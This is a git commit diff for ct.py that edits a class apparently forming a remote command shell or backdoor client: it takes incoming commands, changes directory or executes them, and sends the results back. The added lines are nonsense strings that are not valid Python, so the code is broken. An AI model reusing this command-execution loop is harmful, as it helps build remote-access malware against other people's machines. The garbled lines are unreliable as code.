34fcd1a298905326697701cd4b0c2ba2d680ea94
bartu <efebtopcu17@gmail.com>
2023-08-23 14:25:38 +0300

    trying to push chnges before really writing code

--- ct.py
+++ ct.py
@@ -57,8 +57,11 @@ class ihsanbey:
                 path = command.split(" ")[1] 
                 command_result =  self.change_dir(path)
                 self.reliable_send(command_result)
+                beyler zippidi zpiidi 
+                for i in path :
+                     lapsğdlpqğw 
             else:
-                try:
+                try:    
                     resultt = self.execute_command(command.encode("utf-8"))
                     self.reliable_send(resultt.decode("utf-8"))
                 except BrokenPipeError:
